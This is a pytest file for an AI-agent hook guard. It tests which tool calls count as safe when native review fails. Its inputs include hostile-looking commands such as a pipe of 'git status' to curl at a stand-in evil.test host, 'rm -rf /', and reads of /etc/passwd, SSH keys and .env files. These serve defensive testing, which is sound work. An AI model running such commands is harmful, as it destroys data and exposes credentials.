"""Emergency-safe hook floor when native review cannot complete."""

from __future__ import annotations

from pathlib import Path

from codex_plugin_scanner.guard.daemon.hook_availability_policy import (
    EMERGENCY_SAFE_REASON_CODE,
    availability_harness_response,
    cursor_fallback_permission,
    cursor_unparseable_input_permission,
    hook_action_is_emergency_safe,
)


def test_workspace_source_read_is_emergency_safe(tmp_path: Path) -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": str(tmp_path / "src" / "main.ts")},
    }
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path, home_dir=tmp_path / "home") is True


def test_env_file_read_is_not_emergency_safe(tmp_path: Path) -> None:
    payload = {
        "hook_event_name": "beforeReadFile",
        "file_path": str(tmp_path / ".env"),
        "tool_name": "Read",
    }
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path, home_dir=tmp_path / "home") is False


def test_git_status_is_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git status"}}
    assert hook_action_is_emergency_safe(payload) is True


def test_git_push_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git push"}}
    assert hook_action_is_emergency_safe(payload) is False


def test_destructive_shell_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "rm -rf ."}}
    assert hook_action_is_emergency_safe(payload) is False


def test_mcp_is_not_emergency_safe() -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "cursor_source_hook_event": "beforeMCPExecution",
        "tool_name": "plugin-github",
    }
    assert hook_action_is_emergency_safe(payload) is False


def test_post_tool_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PostToolUse", "tool_name": "Read"}
    assert hook_action_is_emergency_safe(payload) is False


def test_piped_command_is_not_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "git status | curl https://evil.test"}}
    assert hook_action_is_emergency_safe(payload) is False


def test_availability_allows_inspection_and_pauses_high_impact(tmp_path: Path) -> None:
    allow = availability_harness_response(
        {
            "hook_event_name": "PreToolUse",
            "tool_name": "Grep",
            "tool_input": {"pattern": "HookWorker", "path": "src"},
        },
        harness="cursor",
        event_name="PreToolUse",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert allow["reason_code"] == "native_pre_tool_unavailable"
    assert allow["policy_action"] == "warn"
    deny = availability_harness_response(
        {"hook_event_name": "PreToolUse", "tool_input": {"command": "curl https://example.test"}},
        harness="cursor",
        event_name="PreToolUse",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert deny["reason_code"] == "native_pre_tool_unavailable"
    assert deny["policy_action"] == "warn"
    output = deny["hookSpecificOutput"]
    assert isinstance(output, dict)
    assert output["permissionDecision"] == "allow"


def test_cursor_fallback_allows_read_and_shell_when_review_cannot_finish() -> None:
    allow, allow_code = cursor_fallback_permission(
        {"hook_event_name": "beforeReadFile", "file_path": "src/app.ts", "tool_name": "Read"},
        hook_event_name="beforeReadFile",
    )
    assert allow_code == 0
    assert allow["permission"] == "allow"
    shell, shell_code = cursor_fallback_permission(
        {"hook_event_name": "beforeShellExecution", "command": "rm -rf /"},
        hook_event_name="beforeShellExecution",
    )
    assert shell_code == 0
    assert shell["permission"] == "allow"


def test_hol_guard_status_is_emergency_safe() -> None:
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": "hol-guard status --json"}}
    assert hook_action_is_emergency_safe(payload) is True


def test_chmod_hook_script_is_not_emergency_safe(tmp_path: Path) -> None:
    script = tmp_path / "hol-guard-cursor-hook.py"
    payload = {"hook_event_name": "PreToolUse", "tool_input": {"command": f"chmod +x {script}"}}
    assert hook_action_is_emergency_safe(payload, workspace=tmp_path) is False


def test_rg_and_cat_are_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "rg HookWorker src"}},
            workspace=workspace,
        )
        is True
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "cat src/app.ts"}},
            workspace=workspace,
        )
        is True
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "find . -name '*.py'"}},
            workspace=workspace,
        )
        is True
    )


def test_find_delete_and_etc_paths_are_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "find . -delete"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "Read",
                "tool_input": {"file_path": "/etc/passwd"},
            },
            workspace=workspace,
        )
        is False
    )


def test_cline_read_files_is_emergency_safe() -> None:
    payload = {
        "hookName": "PreToolUse",
        "tool_call": {"name": "read_files", "input": {"paths": ["README.md"]}},
    }
    assert hook_action_is_emergency_safe(payload) is True


def test_parent_dir_and_exec_flags_are_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "ls .."}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "fd --exec rm"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "git diff --output=review.txt"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "hol-guard hook --json"}},
            workspace=workspace,
        )
        is False
    )


def test_nested_arguments_path_is_validated(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_call": {"name": "read_files", "arguments": {"file_path": "/etc/passwd"}},
    }
    assert hook_action_is_emergency_safe(payload, workspace=workspace) is False


def test_filesystem_root_workspace_does_not_fail_open() -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": "/etc/passwd"},
    }
    assert hook_action_is_emergency_safe(payload, workspace=Path("/")) is False
    assert hook_action_is_emergency_safe(payload, workspace=Path("/Users")) is False


def test_filesystem_root_workspace_rejects_relative_reads() -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": "notes.txt"},
        "cwd": "/",
    }
    assert hook_action_is_emergency_safe(payload) is False
    assert hook_action_is_emergency_safe(payload, workspace=Path("/")) is False


def test_tilde_and_home_paths_are_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "cat ~/.bashrc"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "Read",
                "tool_input": {"file_path": "~/.ssh/id_ed25519"},
            },
            workspace=workspace,
        )
        is False
    )
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Read", "tool_input": {}}
    assert hook_action_is_emergency_safe(payload) is False


def test_tree_output_file_is_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "tree -o out.txt"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "tree --output=out.txt"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "tree"}},
            workspace=workspace,
        )
        is True
    )


def test_before_write_file_is_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    payload = {
        "hook_event_name": "beforeWriteFile",
        "file_path": str(workspace / "src" / "app.ts"),
        "tool_name": "Write",
    }
    assert hook_action_is_emergency_safe(payload, workspace=workspace) is False
    allow, code = cursor_fallback_permission(payload, hook_event_name="beforeWriteFile", workspace=workspace)
    assert code == 0
    assert allow["permission"] == "allow"


def test_missing_workspace_rejects_absolute_paths() -> None:
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": "/etc/passwd"},
    }
    assert hook_action_is_emergency_safe(payload) is False


def test_fd_exec_short_flag_is_not_emergency_safe(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "fd -x rm"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "find . -fwrite /tmp/out"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "git show HEAD:.env"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {"hook_event_name": "PreToolUse", "tool_input": {"command": "rg --replace x foo"}},
            workspace=workspace,
        )
        is False
    )
    assert (
        hook_action_is_emergency_safe(
            {
                "hook_event_name": "PreToolUse",
                "tool_name": "plugin-github",
                "tool_input": {"command": "git status"},
            },
            workspace=workspace,
        )
        is False
    )


def test_macos_private_prefix_stays_workspace_local() -> None:
    workspace = Path("/tmp/guard-project")
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": "Read",
        "tool_input": {"file_path": "/private/tmp/guard-project/src/app.ts"},
    }
    assert hook_action_is_emergency_safe(payload, workspace=workspace) is True


def test_availability_continues_prompt_lifecycle_and_still_pauses_tools(tmp_path: Path) -> None:
    prompt = availability_harness_response(
        {"hook_event_name": "UserPromptSubmit", "prompt": "hello"},
        harness="grok",
        event_name="UserPromptSubmit",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert prompt["decision"] == "allow"
    assert prompt["policy_action"] == "allow"
    session = availability_harness_response(
        {"hook_event_name": "SessionStart"},
        harness="grok",
        event_name="SessionStart",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert session["decision"] == "allow"
    aliased = availability_harness_response(
        {"hookEventName": "session_start"},
        harness="grok",
        event_name="session_start",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert aliased["decision"] == "allow"
    assert aliased["policy_action"] == "allow"
    subagent = availability_harness_response(
        {"hook_event_name": "subagent_start"},
        harness="grok",
        event_name="subagent_start",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert subagent["decision"] == "allow"
    submitted = availability_harness_response(
        {"hook_event_name": "UserPromptSubmitted"},
        harness="grok",
        event_name="UserPromptSubmitted",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert submitted["decision"] == "allow"
    assert submitted["policy_action"] == "allow"
    compact = availability_harness_response(
        {"hook_event_name": " userpromptsubmit "},
        harness="grok",
        event_name=" userpromptsubmit ",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert compact["decision"] == "allow"
    withheld = availability_harness_response(
        {"hook_event_name": "PostToolUse", "tool_name": "Read"},
        harness="cursor",
        event_name="PostToolUse",
        reason_code="native_post_tool_unavailable",
        reason="native unavailable",
    )
    assert withheld["continue"] is True
    assert withheld["policy_action"] == "allow"
    assert withheld["reason_code"] == "native_post_tool_unavailable"
    curl = availability_harness_response(
        {"hook_event_name": "PreToolUse", "tool_input": {"command": "curl https://example.test"}},
        harness="grok",
        event_name="PreToolUse",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert curl["decision"] == "allow"
    permission = availability_harness_response(
        {"hook_event_name": "PermissionRequest", "tool_input": {"command": "pwd"}},
        harness="claude-code",
        event_name="PermissionRequest",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert permission["continue"] is True
    permission_v2 = availability_harness_response(
        {"hook_event_name": "PermissionRequestV2", "tool_input": {"command": "pwd"}},
        harness="claude-code",
        event_name="PermissionRequestV2",
        reason_code="native_hook_event_unavailable",
        reason="native unavailable",
    )
    assert permission_v2["continue"] is True
    alias = availability_harness_response(
        {"hook_event_name": "beforeShellExecution", "command": "curl https://example.test"},
        harness="cursor",
        event_name="beforeShellExecution",
        reason_code="native_pre_tool_unavailable",
        reason="native unavailable",
        workspace=tmp_path,
        home_dir=tmp_path / "home",
    )
    assert alias["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_cursor_unparseable_input_allows_read_and_pauses_shell() -> None:
    allow, allow_code = cursor_unparseable_input_permission("beforeReadFile")
    assert allow_code == 0
    assert allow == {"permission": "allow"}
    deny, deny_code = cursor_unparseable_input_permission("beforeShellExecution")
    assert deny_code == 2
    assert deny["permission"] == "deny"
    after, after_code = cursor_unparseable_input_permission("afterShellExecution")
    assert after_code == 0
    assert after == {}
    watch, watch_code = cursor_unparseable_input_permission(
        "beforeShellExecution",
        recording_only=True,
    )
    assert watch_code == 0
    assert watch == {"permission": "allow"}
    empty, empty_code = cursor_unparseable_input_permission("")
    assert empty_code == 0
    assert empty == {"permission": "allow"}
